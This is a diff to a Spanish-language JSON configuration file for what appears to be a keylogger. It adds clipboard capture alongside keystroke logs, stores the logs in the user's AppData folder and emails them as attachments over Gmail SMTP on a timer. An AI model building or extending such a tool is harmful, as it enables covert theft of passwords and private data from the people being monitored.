@@ -6,16 +6,19 @@
         "destinatarios": ["destinatario@gmail.com"],
         "asunto_correo": "Prueba de Correo",
         "cuerpo_correo": "Esta es una Prueba del Servicio de Correo EmailMessage Usando SMTP en Python.",
-        "nombre_log_adjunto": "Pulsaciones Recibidas",
+        "nombre_log_pulsaciones_adjunto": "Pulsaciones Recibidas",
+        "nombre_log_portapapeles_adjunto": "Portapapeles Obtenido",
         "puerto": 587,
         "dominio": "gmail.com",
         "tiempo_reenviar_correo": 5,
 
-        "ruta_log": "C:Users\\%username%\\AppData\\Roaming\\",
-        "nombre_log": "",
+        "ruta_log": "C:\\Users\\%username%\\AppData\\Roaming\\",
+        "nombre_log_pulsaciones": "",
+        "nombre_log_portapapeles": "",
+        "caracteres_maximos": 1000,
         "horas_inactivo": 0,
         "minutos_inactivo": 10,
         "segundos_inactivo": 0,
-        "hora_programada": [16,0,0]
+        "hora_programada": [17,0,0]
     }
 }
